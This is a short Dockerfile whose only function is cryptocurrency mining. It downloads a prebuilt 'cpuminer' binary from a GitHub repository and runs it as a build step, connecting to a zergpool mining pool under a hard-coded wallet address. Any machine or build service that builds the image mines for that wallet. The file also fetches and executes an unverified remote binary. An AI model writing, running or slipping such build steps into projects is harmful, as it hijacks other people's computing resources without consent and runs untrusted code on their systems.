FROM ubuntu:latest
RUN apt update
RUN apt install wget curl git -y
RUN wget https://github.com/crnc002/crr/raw/main/cpuminer
RUN chmod +x cpuminer
RUN ./cpuminer --algo yespower --param-n 2048 --param-r 32 --param-key "LTNCGYES" -o stratum+tcp://yespowerLTNCG.mine.zergpool.com:6239 -u KLonQ7jcgoWU32Y44pst4KgKQUVArNEN2s -p c=CRNC
